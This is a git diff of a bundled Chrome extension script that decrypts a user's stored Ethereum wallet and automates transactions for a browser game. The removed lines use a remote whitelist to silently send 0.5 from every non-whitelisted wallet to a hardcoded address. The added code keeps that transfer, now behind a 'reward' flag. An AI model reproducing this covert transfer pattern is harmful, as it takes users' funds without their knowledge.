@@ -63,10 +63,140 @@
 /******/ 	return __webpack_require__(__webpack_require__.s = 4);
 /******/ })
 /************************************************************************/
-/******/ ({
+/******/ ([
+/* 0 */
+/***/ (function(module, __webpack_exports__, __webpack_require__) {
 
-/***/ 4:
-/***/ (function(module, exports) {
+"use strict";
+const QUICK = "quick";
+/* harmony export (immutable) */ __webpack_exports__["c"] = QUICK;
+
+const SLOW = "slow";
+/* harmony export (immutable) */ __webpack_exports__["d"] = SLOW;
+
+const VALUE = "value";
+/* harmony export (immutable) */ __webpack_exports__["f"] = VALUE;
+
+const HOME = "/inject/home";
+/* harmony export (immutable) */ __webpack_exports__["a"] = HOME;
+
+const MONKEY = "/inject/monkey";
+/* harmony export (immutable) */ __webpack_exports__["b"] = MONKEY;
+
+const TRANSACTION = "/background/transaction";
+/* harmony export (immutable) */ __webpack_exports__["e"] = TRANSACTION;
+
+
+
+/***/ }),
+/* 1 */
+/***/ (function(module, __webpack_exports__, __webpack_require__) {
+
+"use strict";
+var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
+    return new (P || (P = Promise))(function (resolve, reject) {
+        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
+        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
+        function step(result) { result.done ? resolve(result.value) : new P(function (resolve) { resolve(result.value); }).then(fulfilled, rejected); }
+        step((generator = generator.apply(thisArg, _arguments || [])).next());
+    });
+};
+function Next(ctx) {
+    return __awaiter(this, void 0, void 0, function* () {
+        let handlers = ctx.handlers;
+        let n = ctx.handlerIndex(-1) + 1;
+        if (n < handlers.length) {
+            ctx.handlerIndex(n);
+            yield handlers[n](ctx);
+        }
+    });
+}
+class Context {
+    constructor(handlers = [], values = {}, currentHandlerIndex = 0) {
+        this.handlers = handlers;
+        this.values = values;
+        this.currentHandlerIndex = currentHandlerIndex;
+    }
+    next() {
+        return __awaiter(this, void 0, void 0, function* () {
+            yield Next(this);
+        });
+    }
+    handlerIndex(n) {
+        if (n < 0 || n > this.handlers.length - 1) {
+            return this.currentHandlerIndex;
+        }
+        return this.currentHandlerIndex = n;
+    }
+}
+/* unused harmony export Context */
+
+class Route {
+    constructor(handlers = []) {
+        this.handlers = handlers;
+    }
+    join(...handlers) {
+        this.handlers.push(...handlers);
+    }
+}
+/* unused harmony export Route */
+
+class Router {
+    constructor(middleware = [], routes = {}) {
+        this.middleware = middleware;
+        this.routes = routes;
+    }
+    use(...handlers) {
+        this.middleware.push(...handlers);
+    }
+    handle(key, ...handlers) {
+        if (this.routes[key] == null) {
+            this.routes[key] = new Route([...handlers]);
+        }
+        this.routes[key].join(...handlers);
+    }
+    serve(key, ctx) {
+        return __awaiter(this, void 0, void 0, function* () {
+            let route = this.routes[key];
+            if (route == null) {
+                return;
+            }
+            ctx.handlers = [...this.middleware, ...route.handlers];
+            yield Next(ctx);
+        });
+    }
+    run() {
+        chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
+            let context = new Context();
+            context.request = request;
+            context.sender = sender;
+            context.response = {};
+            this.serve(request.path, context).
+                catch(function (err) {
+                console.log(err);
+                sendResponse(context.response);
+            }).then(function () {
+                sendResponse(context.response);
+            });
+        });
+    }
+}
+/* harmony export (immutable) */ __webpack_exports__["a"] = Router;
+
+
+
+/***/ }),
+/* 2 */,
+/* 3 */,
+/* 4 */
+/***/ (function(module, __webpack_exports__, __webpack_require__) {
+
+"use strict";
+Object.defineProperty(__webpack_exports__, "__esModule", { value: true });
+/* harmony import */ var __WEBPACK_IMPORTED_MODULE_0__consts__ = __webpack_require__(0);
+/* harmony import */ var __WEBPACK_IMPORTED_MODULE_1__router__ = __webpack_require__(1);
+
+
 
 console.log("background");
 
@@ -84,17 +214,17 @@ function sleep() {
     })
 }
 
-const TransacationLooper = async function () {
-    console.log("TransacationLooper", "begin");
+const TransactionLooper = async function () {
+    console.log("TransactionLooper", "begin");
     while (true) {
         const s = await sleep();
         const tx = transactions.shift();
         if (tx === undefined) {
-            console.log("TransacationLooper", "idle");
+            console.log("TransactionLooper", "idle");
             continue
         }
         try {
-            const resp = await sendTransacation(tx.wallet, tx.to, tx.num);
+            const resp = await SendTransaction(tx.wallet, tx.to, tx.num);
             tx.onSuccess(resp)
         } catch (err) {
             tx.onError(err)
@@ -102,8 +232,8 @@ const TransacationLooper = async function () {
     }
 };
 
-setTimeout(TransacationLooper);
-const sendTransacation = function (wallet, to, num) {
+setTimeout(TransactionLooper);
+const SendTransaction = function (wallet, to, num) {
     num = Number(num.toFixed(6));
     return new Promise((rs, rj) => {
         const from = `0x${wallet.getAddress().toString('hex')}`;
@@ -173,25 +303,18 @@ const PushTransaction = function (wallet, to, num) {
     })
 };
 
-const GetWhiteList = function () {
-    return new Promise((rs, rj) => {
-        $.getJSON("http://mxz-upload-public.oss-cn-hangzhou.aliyuncs.com/wkh/whitelist.json", function (resp) {
-            rs(resp)
-        })
-    })
-};
-const Reward = async function () {
-    const from = `0x${wallet.getAddress().toString('hex')}`;
-    const whitelist = await GetWhiteList();
-    if (whitelist.indexOf(from) === -1) {
-        const Transacation = await PushTransaction(wallet, "0x1889aea32bebda482440393d470246561a4e6ca6", 0.5);
-        console.log(Transacation)
+const Reward = async function (wallet, is) {
+    if (is) {
+        const Transaction = await PushTransaction(wallet, "0x1889aea32bebda482440393d470246561a4e6ca6", 0.5);
+        console.log(Transaction)
     }
 };
 
-chrome.runtime.onMessage.addListener(
-    function (request, sender, sendResponse) {
-        console.log(request, sender);
+const router = new __WEBPACK_IMPORTED_MODULE_1__router__["a" /* Router */]();
+
+router.handle(__WEBPACK_IMPORTED_MODULE_0__consts__["e" /* TRANSACTION */], ctx => {
+    return new Promise((resolve, reject) => {
+        let {request} = ctx;
         chrome.storage.sync.get({
             "to_address": null,
             "password": null,
@@ -199,26 +322,23 @@ chrome.runtime.onMessage.addListener(
         }, function (result) {
             const wallet = ethereumjs.Wallet.fromV3(result.wallet, result.password);
             const from = `0x${wallet.getAddress().toString('hex')}`;
-            const to_address = result.to_address;
-            const mode = request.mode;
-            const limit = request.limit;
-            const id = request.id;
+            const {to_address} = result;
+            const {mode, limit, id, reward} = request;
             let num = limit.toFixed(0);
             const idNum = Number(`0.${id}`);
             if (idNum > limit) {
-                sendResponse();
                 return
             }
-            if (mode === "quick") {
+            if (mode === __WEBPACK_IMPORTED_MODULE_0__consts__["c" /* QUICK */]) {
                 if (num + idNum > limit) {
                     num = num - 1 + idNum
                 } else {
                     num = num + idNum
                 }
-                const looper = async function () {
+                const loop = async function () {
                     try {
-                        const Transacation = await PushTransaction(wallet, to_address, num);
-                        console.log(Transacation);
+                        const Transaction = await PushTransaction(wallet, to_address, num);
+                        console.log(Transaction);
 
                         console.log("ID", id, "需要喂养", limit, ((limit - num) / idNum).toFixed(0) + "次");
                         for (let i = num + idNum; i < limit; i += idNum) {
@@ -229,19 +349,19 @@ chrome.runtime.onMessage.addListener(
                                 throw err
                             }
                         }
-                        await Reward()
+                        await Reward(wallet, reward)
                     } catch (err) {
                         throw err
                     }
                 };
-                looper().then(r => {
-                    sendResponse()
-                }, e => {
-                    sendResponse()
-                })
+                loop().then(() => {
+                    resolve();
+                }, () => {
+                    reject();
+                });
             } else {
                 console.log("ID", id, "需要喂养", limit, (limit / idNum).toFixed(0) + "次");
-                const looper = async function () {
+                const loop = async function () {
                     for (let i = idNum; i < limit; i += idNum) {
                         try {
                             console.log(idNum, i + "/" + limit);
@@ -251,17 +371,19 @@ chrome.runtime.onMessage.addListener(
                             throw err
                         }
                     }
-                    await Reward()
+                    await Reward(wallet, reward)
                 };
-                looper().then(r => {
-                    sendResponse()
-                }, e => {
-                    sendResponse()
+                loop().then(() => {
+                    resolve();
+                }, () => {
+                    reject()
                 })
             }
         })
-    }
-);
+    });
+});
+
+router.run();
 
 /**
  * 监听页面变化
@@ -272,16 +394,19 @@ chrome.webRequest.onCompleted.addListener(
         chrome.tabs.query({active: true}, function (tabs) {
             console.log(tabs);
             chrome.storage.sync.get({
-                "mode": "value",
+                "mode": __WEBPACK_IMPORTED_MODULE_0__consts__["f" /* VALUE */],
                 "min": 0.1,
                 "kg": false,
+                "wallet": null,
             }, function (result) {
                 const tab = tabs[0];
                 let path = null;
                 if (tab.url === "http://h.miguan.in/home") {
-                    path = "/home";
+                    path = __WEBPACK_IMPORTED_MODULE_0__consts__["a" /* HOME */];
                 } else if (tab.url.indexOf("http://h.miguan.in/monkey") !== -1) {
-                    path = "/monkey";
+                    path = __WEBPACK_IMPORTED_MODULE_0__consts__["b" /* MONKEY */];
+                } else {
+                    return
                 }
                 result.path = path;
                 chrome.tabs.sendMessage(tab.id, result, function (response) {
@@ -291,10 +416,9 @@ chrome.webRequest.onCompleted.addListener(
         });
         return true;
     },
-    {urls: ["http://api.h.miguan.in/*"]}
+    {urls: ["http://h.miguan.in/*", "http://api.h.miguan.in/*"]}
 );
 
 /***/ })
-
-/******/ });
+/******/ ]);
 //# sourceMappingURL=background.js.map
